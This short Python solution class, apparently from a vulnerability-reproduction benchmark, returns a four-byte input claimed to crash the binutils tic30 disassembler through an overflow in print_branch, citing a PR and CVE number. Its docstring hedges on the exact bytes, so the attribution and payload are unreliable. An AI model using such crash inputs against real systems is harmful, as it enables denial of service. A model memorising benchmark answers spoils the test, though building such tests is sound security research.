class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in tic30-dis.c.
        This corresponds to binutils PR 18615 / CVE-2020-35496.
        The vulnerability is triggered by a specific instruction (often 0x80000000 or similar variants)
        that causes an array overrun in the print_branch function.
        """
        # The byte sequence \x80\x00\x00\x00 is known to trigger the crash in the tic30 disassembler
        # when processing raw binaries.
        return b'\x80\x00\x00\x00'
